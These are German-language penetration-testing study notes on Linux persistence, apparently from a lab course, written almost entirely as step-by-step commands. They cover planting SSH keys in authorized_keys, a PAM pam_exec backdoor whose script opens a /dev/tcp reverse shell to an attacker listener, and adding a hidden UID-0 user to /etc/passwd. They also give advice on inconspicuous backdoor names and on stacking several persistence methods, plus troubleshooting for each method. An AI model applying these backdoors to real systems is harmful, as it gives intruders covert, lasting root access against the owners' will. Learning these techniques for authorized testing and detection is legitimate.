# Persistence

## 1. Ziel der Phase

- Dauerhaften Zugriff auf das kompromittierte System sicherstellen
- Zugriff auch nach Reboot erhalten
- Zugriff nach Session-Verlust wiederherstellen
- Backdoors und persistente Mechanismen etablieren

---

## 2. Relevante Techniken & Vorgehensweisen

### SSH Key Planting

- Public Key in authorized_keys einfügen
- Password-less Authentication ermöglichen
- Für verschiedene User-Accounts

### PAM Module Abuse

- Backdoor über PAM SSH-Config
- Reverse Shell bei jedem SSH-Login
- Transparent für legitime User

### Backdoor User Creation

- Neuen User mit root-Rechten anlegen
- UID 0 für root-Äquivalenz
- Unauffällige Benennung

---

## 3. Betriebssystem-spezifische Aspekte (Linux)

- SSH als primäres Remote-Access Protokoll
- PAM (Pluggable Authentication Modules) für Login-Kontrolle
- `/etc/passwd` für User-Management
- `authorized_keys` für SSH Key Authentication
- Cron Jobs für wiederkehrende Tasks (nicht in Notes für Persistence)

---

## 4. Typische Angriffsflächen / Ansatzpunkte

### SSH Configuration

- `~/.ssh/authorized_keys` für Key-based Auth
- User Home Directories mit SSH-Zugriff

### PAM Configuration

- `/etc/pam.d/sshd` für SSH-Auth-Hooks
- Custom PAM Modules

### System Files

- `/etc/passwd` für User-Accounts

---

## 5. Wichtige Befehle, Tools & Syntax

### SSH Key Planting

**Schritt 1: SSH Key generieren (auf Kali)**


```bash
ssh-keygen -t rsa
# Output File: rsa.txt
# Public Key: rsa.txt.pub
```

**Schritt 2: Public Key anzeigen**


````bash
cat /home/kali/SimpleCyber/rsa.txt.pub
```

**Beispiel Output:**
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGffHkNVtzV4NjS1xAO4f1GTCoGp5E8pBJMjU3IhUheoLclblzL9FdQ3ieyhA06vjwGQHqUYqvyEU20obs0p2Cz/GI4MaQzkS7tTa9wmJ8KaU64vfI/t3+v9VZO2NFbn/32KMq597xZo5c5fApww0QEl7AE3/j339TYqJGz4lwEfklMYdlYsKGsf2TmKtVERHx/t+Lvyv+C1oYqLF/VxWtTNduHdGVCP8AAcKmMAy8x8padqjywoPxVL/+UjYoLIWVO85tVQBAMq87ca8zcC8MngF9zQRrRue66NwgOFG4IPQ7WqoQ8I7chm8DwMOCrPCl/gHer8A0iOEK7dQp8t1qrAO+EtWFBdlOtVkGfAcLuCTbCnEQaIfuCG5aWh/h/H2iK+gi+TMcIz4dMVaZMNdNbBVgIS8Gd61n2eWA2Vocanr71q2FmHYdSs8bpwkw3KOfrN7OB+9k8xRRThf+eGBN7pisSD/as6CwJSir2QhM9aj/sUHyKoLGgPYUOrLlKMM= kali@kali
````

**Schritt 3: Auf Zielsystem (als Target-User)**


```bash
# SSH Directory erstellen (falls nicht vorhanden)
cd ~
mkdir -p .ssh
cd .ssh

# authorized_keys erstellen
touch authorized_keys

# Public Key einfügen
nano authorized_keys
# Inhalt: Den kopierten Public Key einfügen

# Permissions setzen
chmod 600 authorized_keys
```

**Schritt 4: Von Kali connecten**


```bash
ssh -i ~/SimpleCyber/rsa.txt alice@192.168.xx.x
```

**Für root-User:**


```bash
# Als root auf Zielsystem
su root2
# Password: toor

cd /root
mkdir -p .ssh
cd .ssh
touch authorized_keys
nano authorized_keys
# Public Key einfügen
chmod 600 authorized_keys

# Von Kali
ssh -i ~/SimpleCyber/rsa.txt root2@192.168.xx.x
```

### PAM Module Abuse

**Schritt 1: PAM Config modifizieren (als root)**


```bash
sudo sh -c 'echo "auth required pam_exec.so /tmp/backdoor.sh" >> /etc/pam.d/sshd'
```

**Erklärung:**

- `pam_exec.so /tmp/backdoor.sh` = Bei SSH-Auth wird Script ausgeführt
- `auth required` = Muss erfolgreich sein (blockiert Login wenn Script fehlt)
- Script läuft als root

**Schritt 2: Backdoor Script erstellen**


```bash
cd /tmp
nano backdoor.sh
```

**backdoor.sh Inhalt:**


```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.xx.x/9999 0>&1
```

**Permissions setzen:**


```bash
chmod +x /tmp/backdoor.sh
```

**Schritt 3: Listener auf Kali**


```bash
nc -lvnp 9999
```

**Schritt 4: SSH Login triggern**


```bash
ssh alice@192.168.xx.x
# Hängt beim Login
```

**Ergebnis:**

- Netcat erhält root-Shell
- User-Login hängt (nicht ideal für Stealth)

**Schritt 5: Cleanup (PAM Entry entfernen)**


```bash
# Als root auf Zielsystem
nano /etc/pam.d/sshd
# Letzte Zeile entfernen:
# auth required pam_exec.so /tmp/backdoor.sh
```

**Nach Cleanup:**

- User kann sich wieder normal einloggen
- Root-Shell bleibt bestehen

### Backdoor User Creation

**Schritt 1: Hash generieren**


```bash
openssl passwd toor
# Output: e6WuwLOzqf252
```

**Schritt 2: User in /etc/passwd anlegen (als root)**


````bash
echo "root2:e6WuwLOzqf252:0:0:root:/root:/bin/bash" >> /etc/passwd
```

**Format:**
```
username:password_hash:uid:gid:comment:home:shell
````

**UID 0 = root-Äquivalent**

**Schritt 3: Su zu neuem User**


```bash
su root2
# Password: toor

whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

**Schritt 4: SSH Key für Backdoor-User**


```bash
# Als root2
cd /root
mkdir -p .ssh
cd .ssh
ssh-keygen -t rsa
# Enter für defaults

# authorized_keys erstellen
nano authorized_keys
# Kali Public Key einfügen
chmod 600 authorized_keys

# Von Kali
ssh -i ~/SimpleCyber/rsa.txt root2@192.168.xx.x
```

---

## 6. Reihenfolge, Abhängigkeiten & Hinweise

### Standard Persistence Workflow

1. **SSH Key Planting (Primäre Methode)**


```bash
   # Generiere Keys
   ssh-keygen -t rsa
   
   # Plant Public Key
   echo "PUBLIC_KEY" >> ~/.ssh/authorized_keys
   chmod 600 ~/.ssh/authorized_keys
   
   # Test Connection
   ssh -i private_key user@target
```

2. **Backdoor User (für root-Äquivalent)**


```bash
   # Hash generieren
   openssl passwd password
   
   # User anlegen
   echo "backdoor:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
   
   # SSH Key für User
   cd /root/.ssh
   echo "PUBLIC_KEY" >> authorized_keys
```

3. **PAM Backdoor (Advanced/Noisy)**
    - Nur für temporary Shells
    - Cleanup erforderlich
    - Blockt User-Login während aktiv

### Wichtige Hinweise

**SSH Key Permissions KRITISCH**


```bash
# Private Key (auf Kali)
chmod 600 private_key

# .ssh Directory (auf Target)
chmod 700 ~/.ssh

# authorized_keys (auf Target)
chmod 600 ~/.ssh/authorized_keys
```

**Falsche Permissions = SSH verweigert Connection**

**PAM Backdoor Probleme**

- User-Login hängt während Backdoor aktiv
- Sehr auffällig
- Script muss existieren (sonst Auth fehlschlägt)
- Cleanup nötig nach Verwendung

**PAM Entry Format**


```bash
# Ans ENDE von /etc/pam.d/sshd
auth required pam_exec.so /tmp/backdoor.sh
```

**Backdoor User Best Practices**

- Unauffälliger Name (nicht "backdoor" oder "hacker")
- Beispiele: `support`, `sysadmin`, `operator`
- UID 0 für root-Rechte
- Shell: `/bin/bash` für interaktive Sessions

**SSH Key Planting Vorteile**

- Password-less Login
- Weniger auffällig als neue User
- Funktioniert nach Reboot
- Keine System-File-Änderungen (außer authorized_keys)

**Multiple Persistence Methods**

- SSH Keys für mehrere User planten
- Backdoor User als Fallback
- Verschiedene Keys für verschiedene User

**Testing Persistence**


```bash
# Nach Setup
exit  # Aus Shell
ssh -i private_key user@target  # Neu connecten
# Sollte ohne Password funktionieren
```

**Cleanup Considerations**


```bash
# SSH Keys entfernen
rm ~/.ssh/authorized_keys

# Backdoor User entfernen
sed -i '/^root2:/d' /etc/passwd

# PAM Config zurücksetzen
nano /etc/pam.d/sshd
# Backdoor-Zeile löschen
```

---

## 7. Typische Findings & Fehler

### Häufige Findings

**SSH Keys erfolgreich geplant**


```bash
# Test erfolgreich
ssh -i ~/SimpleCyber/rsa.txt alice@192.168.xx.x
# Direkter Login ohne Password
```

**Backdoor User funktioniert**


```bash
su root2
# Password: toor
whoami
# root
id
# uid=0(root)
```

**PAM Backdoor liefert Shell**


```bash
# Nach SSH-Trigger
nc -lvnp 9999
# connect from TARGET
whoami
# root
```

### Typische Fehler

**SSH Key: Permissions falsch**


```bash
# Fehler bei Connection
ssh -i private_key user@target
# Permissions 0644 for 'private_key' are too open

# Fix
chmod 600 private_key
```

**authorized_keys: Falsche Permissions**


```bash
# Auf Target
ls -la ~/.ssh/authorized_keys
# -rw-r--r-- (falsch!)

ssh -i key user@target
# Permission denied (publickey)

# Fix
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```

**PAM Backdoor: Script nicht executable**


```bash
# backdoor.sh existiert, aber
ls -la /tmp/backdoor.sh
# -rw-r--r--

# SSH Login hängt, keine Shell

# Fix
chmod +x /tmp/backdoor.sh
```

**PAM Backdoor: Falscher Path**


```bash
# PAM Config
auth required pam_exec.so backdoor.sh

# Fehler: Relativer Path
# Script wird nicht gefunden

# Fix: Absoluter Path
auth required pam_exec.so /tmp/backdoor.sh
```

**Backdoor User: UID nicht 0**


```bash
# /etc/passwd
backdoor:hash:1000:1000:root:/root:/bin/bash

su backdoor
id
# uid=1000(backdoor) - KEIN root!

# Fix: UID auf 0
backdoor:hash:0:0:root:/root:/bin/bash
```

**Backdoor User: Kein Shell**


```bash
# /etc/passwd
backdoor:hash:0:0:root:/root:/usr/sbin/nologin

su backdoor
# This account is currently not available

# Fix: Shell setzen
backdoor:hash:0:0:root:/root:/bin/bash
```

**SSH Key: Falscher User**


```bash
# Key geplant für alice
cd /home/alice/.ssh
echo "PUBLIC_KEY" >> authorized_keys

# Aber connecten als bob
ssh -i key bob@target
# Permission denied

# Fix: Key für richtigen User
cd /home/bob/.ssh
echo "PUBLIC_KEY" >> authorized_keys
```

**Public vs Private Key verwechselt**


```bash
# Private Key in authorized_keys
cat rsa.txt >> ~/.ssh/authorized_keys  # FALSCH!

# Fix: Public Key verwenden
cat rsa.txt.pub >> ~/.ssh/authorized_keys
```

**PAM Backdoor: Listener nicht gestartet**


```bash
# SSH Login getriggert
ssh alice@target

# Aber kein Listener auf Kali
# Connection fails silently

# Fix: Listener VOR SSH-Trigger
nc -lvnp 9999
```

**authorized_keys: Mehrere Keys in einer Zeile**


```bash
# Falsch
ssh-rsa KEY1 user@host ssh-rsa KEY2 user@host

# Richtig: Jeder Key eigene Zeile
ssh-rsa KEY1 user@host
ssh-rsa KEY2 user@host
```

**PAM Config: Syntax-Fehler**


```bash
# Falsch
auth required pam_exec.so/tmp/backdoor.sh  # Kein Space

# Richtig
auth required pam_exec.so /tmp/backdoor.sh
```

**Backdoor User: Password-Hash im Klartext**


```bash
# Falsch
echo "backdoor:toor:0:0:root:/root:/bin/bash" >> /etc/passwd

su backdoor
# Password: toor
# Authentication failure

# Richtig: Hash generieren
openssl passwd toor
# e6WuwLOzqf252
echo "backdoor:e6WuwLOzqf252:0:0:root:/root:/bin/bash" >> /etc/passwd
```

**SSH Key nicht getestet**


```bash
# Key geplant
echo "PUBLIC_KEY" >> authorized_keys

# Nicht getestet
# Session verloren

# Key funktioniert nicht
# Kein Zugriff mehr

# Best Practice: Immer in neuer Session testen BEVOR alte Session geschlossen
```
